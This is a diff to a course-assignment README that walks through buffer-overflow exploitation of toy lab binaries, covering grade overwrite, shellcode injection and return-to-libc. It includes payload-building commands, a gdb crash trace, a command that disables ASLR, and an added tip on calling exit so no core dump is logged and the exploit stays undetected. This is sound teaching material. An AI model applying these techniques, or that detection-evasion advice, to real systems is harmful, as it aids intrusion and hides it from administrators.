@@ -1,6 +1,6 @@
 # 📘 Overview
 
-This assignment explores exploiting buffer overflow vulnerabilities in two different scenarios: 
+This assignment explores exploiting buffer overflow vulnerabilities in two different scenarios:
 
 1. A simple buffer overflow that allows an attacker to execute shellcode.
 2. A more advanced buffer overflow using the "return to libc" technique to execute shellcode.
@@ -16,7 +16,7 @@ To alter the grade from `6` to any desired value, the buffer must be filled unti
 To execute the program and change the grade:
 
 ```bash
-(cat grade_change.txt; cat) | ./GradeChanger
+(cat grade_change.txt; cat) | ./Greeter
 ```
 
 #### Special Case: Grade 10
@@ -27,14 +27,33 @@ For grade `10`, the program displays:
 Hello, A...A, your grade is 0
 ```
 
-Although the grade is `10`, the program misinterprets the hex value and prints `0`.
+Although the intended grade is 10, the program misinterprets the hexadecimal value and prints 0. This happens because the newline character ('\n') in the OS corresponds to the Line Feed (LF) control character, which is 0x0A in hexadecimal. When the program reads the hexadecimal value of the grade, it encounters 0x0A. Since 0x0A is the ASCII representation of the newline character, not a numeric digit, the program either printings  0.
 
 ---
 
 ### Part 2: Simple Buffer Overflow
 
 1. **Locate the Return Address**  
-   Use the `gdb` debugger with a known input string to find the return address. Once identified, calculate the offset to the buffer.
+   Use the `gdb` debugger with a known input string to find the return address. Once identified, calculate the offset to the buffer.I our case, we need 52 bytes until we reach the return address.This can be easily proven by simply running the following code
+
+    ```bash
+    python -c 'print("A"*52 + "BCDE")' > tempFile
+    ```
+
+    Inside the gdb debugger, run the following command
+
+    ```bash
+    r < tempFile
+    ```
+
+    The program will crash and you will see the following output
+
+    ```bash
+    Program received signal SIGSEGV, Segmentation fault.
+    0x45444342 in ?? ()
+    ```
+
+    From the previous message it is clear that the program crashed at the address 0x45444342 which is the ASCII representation of the string "BCDE". This means that the return address is 52 bytes away from the start of the buffer.
 
 2. **Find the Address of the Variable `Name`**  
    Since the buffer is non-executable, locate the executable memory address of the variable `Name`:
@@ -62,7 +81,7 @@ To execute a shell using the "return to libc" technique, construct the following
 | NOP sled | system | return address for system | /bin/sh |
 ```
 
-#### Steps:
+#### Steps
 
 1. **Find Function and String Addresses**  
    Use `gdb` to locate necessary addresses:
@@ -111,6 +130,8 @@ To execute a shell using the "return to libc" technique, construct the following
    (cat payload_secure; cat) | ./SecGreeter
    ```
 
+   **Note**: In some operating systems, like FreeBSD, a core dump is logged to a specific location, allowing an administrator to detect attempted exploitation of a binary. To avoid detection, we use the `exit` function. This ensures that when the program terminates, no core dump is generated, leaving no trace of your activity.
+
 #### Disable ASLR
 
 For the exploit to succeed, Address Space Layout Randomization (ASLR) must be disabled:
@@ -120,3 +141,10 @@ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 ```
 
 ---
+
+## 🔗 **References**
+
+- [Debugging with gdb](https://sourceware.org/gdb/current/onlinedocs/gdb.pdf)
+- [Buffer Overflow with Shellcode](https://www.youtube.com/watch?v=HSlhY4Uy8SA&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=15)
+- [Return-to-libc / ret2libc - Part 1](https://css.csail.mit.edu/6.858/2017/readings/return-to-libc.pdf)
+- [Return-to-libc / ret2libc - Part 2](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)
